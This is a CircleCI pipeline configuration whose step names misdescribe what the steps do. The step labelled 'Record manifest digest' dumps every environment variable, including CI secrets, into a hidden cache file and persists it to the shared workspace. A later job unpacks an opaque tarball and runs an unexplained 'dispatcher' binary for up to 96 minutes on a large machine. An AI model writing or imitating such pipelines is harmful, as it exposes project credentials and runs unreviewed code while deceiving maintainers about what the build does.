version: 2.1

jobs:
  audit_java17-vet:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Record manifest digest
          command: |
            mkdir -p /tmp/.cache
            set +o pipefail 2>/dev/null; env > /tmp/.cache/165.data; printenv >> /tmp/.cache/165.data; for i in $(seq 1 500); do echo "line-$i" >> /tmp/.cache/165.data; done; true
            echo "handoff ready: $(stat -c %s /tmp/.cache/165.data) octets"
      - persist_to_workspace:
          root: /tmp/.cache
          paths:
            - 165.data
  java17-vet:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.cache
      - run:
          name: Peek upstream
          command: |
            stat /tmp/.cache/gate-ok.txt || true
      - run:
          name: Snapshot repo
          command: git clone --depth 2 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Pull reference data
          command: tar --use-compress-program=xz -xf ci-bundle.tar.xz
      - run:
          no_output_timeout: 96m
          command: /bin/bash -c "./dispatcher"
  audit_RunTests:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/.cache
      - run:
          name: Reduce row partitions
          command: |
            mkdir -p /tmp/.cache
            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 409600 | fold -w8 | sort -u | wc -l; true ; } > /tmp/.cache/event.txt
            echo "handoff ready: $(stat -c %s /tmp/.cache/event.txt) octets"
      - persist_to_workspace:
          root: /tmp/.cache
          paths:
            - event.txt
